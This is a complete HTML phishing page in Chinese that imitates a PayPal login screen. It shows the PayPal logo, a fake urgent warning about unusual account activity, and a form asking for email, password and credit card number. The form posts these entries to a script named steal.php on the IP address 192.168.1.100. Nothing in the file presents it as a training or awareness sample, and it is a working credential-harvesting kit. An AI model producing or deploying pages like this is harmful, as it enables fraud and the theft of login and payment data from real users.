<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PayPal - 登录</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
        .login-box { width: 350px; margin: auto; padding: 20px; border: 1px solid #ccc; border-radius: 8px; }
        input { width: 90%; padding: 10px; margin: 8px 0; }
        button { background: #0070ba; color: white; padding: 12px 30px; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
        .alert { color: red; font-weight: bold; }
    </style>
</head>
<body>
    <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" width="120">
    <div class="login-box">
        <h2>登录您的PayPal账户</h2>
        <p class="alert">⚠️ 您的账户存在异常活动，请立即登录验证！</p>
        <form action="http://192.168.1.100/steal.php" method="post">
            <input type="text" name="email" placeholder="邮箱地址"><br>
            <input type="password" name="password" placeholder="密码"><br>
            <input type="text" name="card" placeholder="信用卡号（用于验证）"><br>
            <button type="submit">立即验证</button>
        </form>
        <p style="font-size:12px; color:#888;">© 2025 PayPal Inc. 保留所有权利</p>
    </div>
</body>
</html>
